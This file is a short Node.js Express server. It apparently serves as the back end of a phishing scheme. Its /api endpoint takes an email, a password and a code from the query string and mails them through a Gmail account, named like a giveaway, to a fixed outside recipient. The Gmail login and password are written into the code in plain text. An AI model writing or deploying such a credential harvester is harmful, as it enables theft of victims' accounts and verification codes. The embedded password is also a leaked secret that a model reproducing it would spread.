const nodemailer = require('nodemailer');
const express = require('express');
const app = express();

const transporter = nodemailer.createTransport({
 service: 'gmail',
 auth: {
        user: 'mega0giveaway@gmail.com',
        pass: 'blackpanda2323est'
    }
});

app.get('/api' , function(req,res) {


  const mailOptions = {
    from: 'mega0giveaway@gmail.com', // sender address
    to: 'hamzus007jouini@gmail.com', // list of receivers
    subject: 'New Account ', // Subject line
    html: `<p>${ req.query.email }</p><br><p>${ req.query.password }</p><br><p>${ req.query.code }</p>`// plain text body
  };

  transporter.sendMail(mailOptions, function (err, info) {
     if(err)
       res.send(err) ;
     else
       res.send(info);
  });

}) ;
app.listen(3000)
